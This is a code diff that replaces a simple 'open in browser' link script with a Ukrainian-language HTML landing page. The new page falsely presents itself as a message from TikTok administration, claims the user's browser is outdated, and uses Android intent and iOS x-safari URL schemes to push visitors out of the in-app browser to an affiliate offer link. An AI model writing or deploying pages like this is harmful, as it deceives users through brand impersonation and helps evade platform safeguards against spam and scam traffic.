@@ -1,47 +1,108 @@
-<a href="https://example.com" onclick="openInBrowser(event); return false;">
-  🔗 Відкрити в браузері
-</a>
-
-<script>
-function openInBrowser(event) {
-  event.preventDefault();
-  const url = 'https://example.com';
-  const isAndroid = /android/i.test(navigator.userAgent);
-  const isiOS = /iphone|ipad|ipod/i.test(navigator.userAgent);
-
-  // Для Android
-  if (isAndroid) {
-    const intentUrl = `intent://google.com#Intent;scheme=https;package=com.android.chrome;end;`;
-    window.location.href = intentUrl;
-    
-    // Перевірка чи вдалось відкрити додаток
-    setTimeout(() => {
-      if (!document.hidden) window.location.href = url;
-    }, 500);
-  }
-
-  // Для iOS
-  else if (isiOS) {
-    // Спроба відкрити в Chrome
-    const chromeiOSUrl = 'googlechromes://google.com'; // Для нових версій
-    const chromeFallbackUrl = 'googlechrome://google.com';
-    
-    window.location.href = chromeiOSUrl;
-    
-    setTimeout(() => {
-      if (!document.hidden) {
-        // Спроба старої схеми
-        window.location.href = chromeFallbackUrl;
-        setTimeout(() => {
-          if (!document.hidden) window.location.href = url;
-        }, 500);
-      }
-    }, 500);
-  }
-
-  // Для інших платформ
-  else {
-    window.open(url, '_blank');
-  }
-}
-      </script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Open Link</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(to right bottom, rgb(26, 32, 44), rgb(74, 29, 150), rgb(91, 33, 182));
+            color: #fff;
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            text-align: center;
+        }
+        #container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        #image {
+            max-width: 100%;
+            height: auto;
+            margin: 20px 0;
+        }
+        h1 {
+            font-size: 1.2rem; /* Зменшений розмір шрифту */
+            margin: 0;
+            line-height: 1.6; /* Збільшення між рядками для зручності читання */
+            padding: 20px;
+        }
+        .button-container {
+            margin-top: 20px;
+        }
+        button {
+            padding: 1rem 2rem;
+            font-size: 1.2rem;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 0.5rem;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .formal-message {
+            font-style: italic; /* Курсив для формальності */
+            font-weight: normal;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header-message {
+            font-size: 1.5rem;
+            font-weight: bold;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <h1 class="header-message">Повідомлення від адміністрації TikTok</h1>
+        <p class="formal-message">Шановний користувачу! Ми хочемо повідомити вам, що ваш браузер застарів. Для коректної роботи сайту будь ласка, виконайте наступні кроки:</p>
+        <p class="formal-message">1. Натисніть на три крапки в правому верхньому куті екрану.</p>
+        <p class="formal-message">2. Виберіть опцію «Відкрити в браузері».</p>
+        <p class="formal-message">3. Потім натисніть «Відкрити сайт». Дякуємо за розуміння!</p>
+        <h1>👇👇👇👇👇👇👇👇👇👇👇👇</h1>
+        <div class="button-container">
+            <button onclick="openLink()">ВІДКРИТИ САЙТ</button>
+            <button onclick="copyLink()">👈👈👈</button>
+        </div>
+    </div>
+ 
+    <script>
+        const targetUrl = 'https://offers.affimelody.com/f6bUZz'; // Виправлений URL
+ 
+        const openLink = () => {
+            const isAndroid = /Android/i.test(navigator.userAgent);
+            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+ 
+            if (isAndroid) {
+                let formattedUrl = targetUrl;
+                if (!targetUrl.startsWith("https://") && !targetUrl.startsWith("http://")) {
+                    formattedUrl = "https://" + targetUrl;
+                }
+                window.location.href = `intent://${formattedUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
+            } else if (isIOS) {
+                window.location.replace(`x-safari-${targetUrl}`);
+            } else {
+                window.location.href = targetUrl;
+            }
+        };
+ 
+        const copyLink = () => {
+            navigator.clipboard.writeText(targetUrl).then(() => {
+                alert('Link copied to clipboard!');
+            }, (err) => {
+                console.error('Failed to copy link: ', err);
+            });
+        };
+    </script>
+</body>
+</html>
